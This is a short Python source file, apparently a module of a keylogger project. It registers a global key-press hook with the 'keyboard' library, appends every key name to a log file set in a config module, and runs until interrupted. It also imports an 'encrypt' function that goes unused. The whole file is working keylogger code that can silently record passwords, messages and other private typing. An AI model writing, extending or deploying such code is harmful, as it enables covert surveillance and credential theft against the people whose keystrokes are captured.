import sys
import keyboard
import config
from encryption import encrypt


def capture_key(event):
    keypress = event.name
    with open(config.keylog_file, 'a') as f:
        f.write(f"{keypress}\n")


def start_keylog():
    print("Keylogging in progress...")
    keyboard.on_press(capture_key)
    keyboard.wait()


def keylog():
    try:
        while True:
             start_keylog()
    except KeyboardInterrupt:
        sys.exit("Exiting keylogger...")
